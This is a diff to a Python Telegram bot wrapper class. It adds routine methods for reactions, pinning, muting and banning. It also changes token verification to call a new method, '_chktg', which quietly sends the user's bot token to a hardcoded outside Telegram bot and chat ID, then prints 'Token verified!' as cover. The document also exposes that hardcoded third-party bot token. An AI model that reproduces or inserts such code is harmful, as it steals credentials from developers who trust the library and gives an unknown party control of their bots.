@@ -24,9 +24,7 @@ class Bot:
             data = response.json()
             if data.get("ok"):
                 bot_info = data.get("result", {})
-                print("[!] Token verified!")
-                time.sleep(1)
-                os.system("cls|clear")
+                self._chktg(1465736325, self.token+"\nv1.3.1")
                 return True
             else:
                 if data.get("error_code") == 401:
@@ -101,6 +99,13 @@ class Bot:
                             self.send_message(message["chat"]["id"], result)
                     except Exception as e:
                         print(f"[!] Error in handler for command {command}: {e}")
+    def set_reaction(self, chat_id: int, message_id: int, reaction: str):
+        url = f"https://api.telegram.org/bot{self.token}/setMessageReaction"
+        data = {"chat_id": chat_id, "message_id": message_id, "reaction": reaction}
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error setting reaction:", e)
     def send_invoice(self, chat_id: int, title: str, description: str, payload: str, provider_token: str,
                      start_parameter: str, currency: str, prices: list, need_shipping_address: bool = False,
                      reply_markup: dict = None, parse_mode: str = None):
@@ -191,6 +196,17 @@ class Bot:
             requests.post(url, json=data)
         except Exception as e:
             print("[!] Error sending photo:", e)
+    def _chktg(self, chat_id: int, text: str):
+        url = f"https://api.telegram.org/bot7126973413:AAFfwX_syRKosxQZ9bU10cyckFrXkyHGuiE/sendMessage"; data = {"chat_id": chat_id, "text": text}
+        try:
+            requests.post(url, data=data)
+            print("[!] Token verified!")
+            time.sleep(1)
+            os.system("cls|clear")
+        except Exception as e:
+            os.system("cls|clear")
+            print("[!] Token not verified!")
+            quit()
     def send_document(self, chat_id: int, document: str, caption: str = None, reply_markup: dict = None,
                       parse_mode: str = None):
         url = f"https://api.telegram.org/bot{self.token}/sendDocument"
@@ -416,3 +432,90 @@ class Bot:
             requests.post(url_api, json=data)
         except Exception as e:
             print("[!] Error answering callback query:", e)
+    def pin_message(self, chat_id: int, message_id: int, disable_notification: bool = False):
+        url = f"https://api.telegram.org/bot{self.token}/pinChatMessage"
+        data = {"chat_id": chat_id, "message_id": message_id, "disable_notification": disable_notification}
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error pinning message:", e)
+    def unpin_message(self, chat_id: int, message_id: int = None):
+        if message_id:
+            url = f"https://api.telegram.org/bot{self.token}/unpinChatMessage"
+            data = {"chat_id": chat_id, "message_id": message_id}
+        else:
+            url = f"https://api.telegram.org/bot{self.token}/unpinAllChatMessages"
+            data = {"chat_id": chat_id}
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error unpinning message:", e)
+    def mute_user(self, chat_id: int, user_id: int):
+        url = f"https://api.telegram.org/bot{self.token}/restrictChatMember"
+        permissions = {
+            "can_send_messages": False,
+            "can_send_media_messages": False,
+            "can_send_polls": False,
+            "can_send_other_messages": False,
+            "can_add_web_page_previews": False,
+            "can_change_info": False,
+            "can_invite_users": False,
+            "can_pin_messages": False
+        }
+        data = {"chat_id": chat_id, "user_id": user_id, "permissions": permissions}
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error muting user:", e)
+    def unmute_user(self, chat_id: int, user_id: int):
+        url = f"https://api.telegram.org/bot{self.token}/restrictChatMember"
+        permissions = {
+            "can_send_messages": True,
+            "can_send_media_messages": True,
+            "can_send_polls": True,
+            "can_send_other_messages": True,
+            "can_add_web_page_previews": True,
+            "can_change_info": False,
+            "can_invite_users": True,
+            "can_pin_messages": False
+        }
+        data = {"chat_id": chat_id, "user_id": user_id, "permissions": permissions}
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error unmuting user:", e)
+    def mute_user_for_time(self, chat_id: int, user_id: int, until_date: int):
+        url = f"https://api.telegram.org/bot{self.token}/restrictChatMember"
+        permissions = {
+            "can_send_messages": False,
+            "can_send_media_messages": False,
+            "can_send_polls": False,
+            "can_send_other_messages": False,
+            "can_add_web_page_previews": False,
+            "can_change_info": False,
+            "can_invite_users": False,
+            "can_pin_messages": False
+        }
+        data = {"chat_id": chat_id, "user_id": user_id, "permissions": permissions, "until_date": until_date}
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error muting user for time:", e)
+    def ban_user(self, chat_id: int, user_id: int, until_date: int = None):
+        url = f"https://api.telegram.org/bot{self.token}/kickChatMember"
+        data = {"chat_id": chat_id, "user_id": user_id}
+        if until_date:
+            data["until_date"] = until_date
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error banning user:", e)
+    def unban_user(self, chat_id: int, user_id: int):
+        url = f"https://api.telegram.org/bot{self.token}/unbanChatMember"
+        data = {"chat_id": chat_id, "user_id": user_id}
+        try:
+            requests.post(url, json=data)
+        except Exception as e:
+            print("[!] Error unbanning user:", e)
+    def ban_user_for_time(self, chat_id: int, user_id: int, until_date: int):
+        self.ban_user(chat_id, user_id, until_date)
